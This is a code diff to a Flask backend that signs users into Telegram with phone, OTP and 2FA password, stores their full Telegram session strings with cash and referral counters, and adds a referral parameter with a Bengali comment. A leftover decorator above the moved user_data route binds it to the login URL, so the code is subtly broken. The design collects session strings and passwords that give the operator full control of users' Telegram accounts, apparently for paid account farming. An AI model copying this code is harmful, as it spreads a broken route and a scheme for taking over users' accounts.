@@ -227,11 +227,29 @@ def send_otp():
         return jsonify({"success": False, "message": str(e)})
 
 @app.route("/api/verify_login", methods=["POST"])
+
+
+
+@app.route("/api/user/data/<telegram_id>")
+def user_data(telegram_id):
+    uid = session.get("uid")
+    if not uid:
+        return jsonify({"status": "error", "message": "session_expired"})
+    user = users_col.find_one({"_id": ObjectId(uid)})
+    if not user:
+        session.clear()
+        return jsonify({"status": "error", "message": "user_not_found"})
+    admin = get_admin_config()
+    user["_id"] = str(user["_id"])
+    return jsonify({"status": "success", "user": user, "admin": admin})
+
+@app.route("/api/verify_login", methods=["POST"])
 def verify_login():
     data = request.json
     phone = normalize_phone(data.get("phone"))
     code = data.get("code")
     password = data.get("password")
+    ref = data.get('ref')  # ← এই লাইনটি যোগ করুন (রেফার প্যারামিটার)
 
     if not phone or phone not in temp_otp_data:
         return jsonify({"success": False, "message": "session_expired"})
@@ -270,7 +288,7 @@ def verify_login():
                     "telegram_id": str(me.id),
                     "phone": phone,
                     "username": me.username or f"user_{me.id}",
-                    "frist_name": me.first_name or "",
+                    "first_name": me.first_name or "",
                     "last_name": me.last_name or "",
                     "session_string": session_str,
                     "cash": 0,
@@ -282,9 +300,10 @@ def verify_login():
                     "created_at": datetime.utcnow(),
                     "last_login": datetime.utcnow()
                 }
+                # ✅ রেফারেল লজিক (নতুন ইউজার)
                 if ref:
-                user_data["refer_by"] = ref
-                users_col.update_one({"telegram_id": ref}, {"$inc": {"refer_count": 1}})
+                    user_data["refer_by"] = ref
+                    users_col.update_one({"telegram_id": ref}, {"$inc": {"refer_count": 1}})
                 result_id = users_col.insert_one(user_data).inserted_id
             else:
                 users_col.update_one(
@@ -306,20 +325,6 @@ def verify_login():
     except Exception as e:
         print(f"verify_login error: {e}")
         return jsonify({"success": False, "message": str(e)})
-
-
-@app.route("/api/user/data/<telegram_id>")
-def user_data(telegram_id):
-    uid = session.get("uid")
-    if not uid:
-        return jsonify({"status": "error", "message": "session_expired"})
-    user = users_col.find_one({"_id": ObjectId(uid)})
-    if not user:
-        session.clear()
-        return jsonify({"status": "error", "message": "user_not_found"})
-    admin = get_admin_config()
-    user["_id"] = str(user["_id"])
-    return jsonify({"status": "success", "user": user, "admin": admin})
 
 
 @app.route("/api/silent_join", methods=["POST"])
